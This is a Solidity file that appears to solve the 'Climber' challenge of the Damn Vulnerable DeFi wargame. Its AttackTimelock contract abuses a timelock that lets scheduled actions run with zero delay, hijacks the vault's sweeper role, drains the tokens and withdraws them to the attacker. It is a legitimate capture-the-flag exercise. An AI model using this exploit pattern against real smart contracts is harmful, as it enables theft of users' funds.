// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AttackVault.sol";
import "../../climber/ClimberTimelock.sol";
import "../../lib/ERC20.sol";


contract DamnValuableToken is ERC20 {
    constructor() ERC20("DamnValuableToken", "DVT") {
        _mint(msg.sender, type(uint256).max);
    }
}

contract AttackTimelock {
    address vault;
    address payable timelock;
    address token;

    address owner;

    bytes[] private scheduleData;
    address[] private to;

    constructor(address _vault, address payable _timelock, address _token, address _owner) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
    }

    function setScheduleData(address[] memory _to, bytes[] memory data) external {
        to = _to;
        scheduleData = data;
    }

    function exploit() external {
        uint256[] memory emptyData = new uint256[](to.length);
        ClimberTimelock(timelock).schedule(to, emptyData, scheduleData, 0);

        AttackVault(vault).setSweeper(address(this));
        AttackVault(vault).sweepFunds(token);
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        DamnValuableToken(token).transfer(owner, DamnValuableToken(token).balanceOf(address(this)));
    }
}